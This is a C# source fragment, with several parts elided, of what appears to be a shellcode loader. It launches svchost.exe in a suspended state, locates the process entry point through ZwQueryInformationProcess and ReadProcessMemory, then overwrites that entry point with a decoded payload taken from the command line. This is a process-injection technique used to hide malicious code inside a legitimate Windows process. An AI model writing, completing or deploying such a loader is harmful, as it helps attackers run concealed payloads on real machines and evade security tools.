        ...
        */
        ...
        static void Main(string[] args)
        {
            ...
            */
            ...
            string k = args[0];
            string p = "@@@";
            byte[] buf = transformString(args[0], p);
            ...
            bool result = CreateProcess(null, "c:\\windows\\system32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x04, IntPtr.Zero, null, ref sInfo, out pInfo);
            if (result == false) {
                goto Fail;
            }

            STRUCTS.PROCESS_BASIC_INFORMATION pbInfo = new STRUCTS.PROCESS_BASIC_INFORMATION();
            uint retLen = new uint();
            long qResult = ZwQueryInformationProcess(pInfo.hProcess, 0x0, ref pbInfo, (uint)(IntPtr.Size * 6), ref retLen);
            if (qResult != 0) {
                goto Fail;
            }
            ...
            IntPtr exAddr = (IntPtr)BitConverter.ToInt64(procAddr, 0);
            result = ReadProcessMemory(pInfo.hProcess, exAddr, dataBuf, dataBuf.Length, out bytesRW);
            if (result == false) {
                goto Fail;
            }
            ...
            IntPtr enAddr = (IntPtr)((Int64)exAddr + rva);
            
            result = WriteProcessMemory(pInfo.hProcess, enAddr, buf, buf.Length, out bytesRW);
            if (result == false) {
                goto Fail;
            }
